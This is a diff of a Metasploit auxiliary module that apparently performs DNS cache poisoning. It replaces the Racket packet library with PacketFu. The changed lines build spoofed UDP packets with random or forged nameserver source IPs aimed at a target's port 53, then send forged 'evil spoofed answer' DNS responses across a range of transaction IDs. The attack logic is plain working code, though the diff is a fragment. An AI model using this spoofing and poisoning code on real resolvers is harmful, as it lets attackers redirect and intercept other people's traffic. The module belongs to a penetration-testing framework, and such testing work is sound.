@@ -11,7 +11,6 @@
 
 require 'msf/core'
 require 'net/dns'
-require 'racket'
 require 'resolv'
 
 class Metasploit3 < Msf::Auxiliary
@@ -313,21 +312,16 @@ class Metasploit3 < Msf::Auxiliary
 				src_ip = Rex::Text.rand_text(4).unpack("C4").join(".")
 			end
 
-			n = Racket::Racket.new
-			n.l3 = Racket::L3::IPv4.new
-			n.l3.src_ip = src_ip
-			n.l3.dst_ip = target
-			n.l3.protocol = 17
-			n.l3.id = rand(0x10000)
-			n.l3.ttl = 255
-			n.l4 = Racket::L4::UDP.new
-			n.l4.src_port = (rand((2**16)-1024)+1024).to_i
-			n.l4.dst_port = 53
-			n.l4.payload  = req.encode
-			n.l4.fix!(n.l3.src_ip, n.l3.dst_ip)
-			buff = n.pack
+			p = PacketFu::UDPPacket.new
+			p.ip_saddr = src_ip
+			p.ip_daddr = target
+			p.ip_ttl = 255
+			p.udp_sport = (rand((2**16)-1024)+1024).to_i
+			p.udp_dport = 53
+			p.payload = req.encode
+			p.recalc
 
-			capture_sendto(buff, target)
+			capture_sendto(p, target)
 			queries += 1
 
 			# Send evil spoofed answer from ALL nameservers (barbs[*][:addr])
@@ -337,19 +331,17 @@ class Metasploit3 < Msf::Auxiliary
 			req.qr = 1
 			req.aa = 1
 
-			# Reuse our Racket object
-			n.l4.src_port = 53
-			n.l4.dst_port = sport.to_i
+			# Reuse our PacketFu object
+			p.udp_sport = 53
+			p.udp_dport = sport.to_i
 
 			xidbase.upto(xidbase+numxids-1) do |id|
 				req.id = id
-				n.l4.payload = req.encode
+				p.payload = req.encode
 				barbs.each do |barb|
-					n.l3.src_ip = barb[:addr].to_s
-					n.l4.fix!(n.l3.src_ip, n.l3.dst_ip)
-					buff = n.pack
-
-					capture_sendto(buff, target)
+					p.ip_saddr = barb[:addr].to_s
+					p.recalc
+					capture_sendto(p, target)
 					responses += 1
 				end
 			end
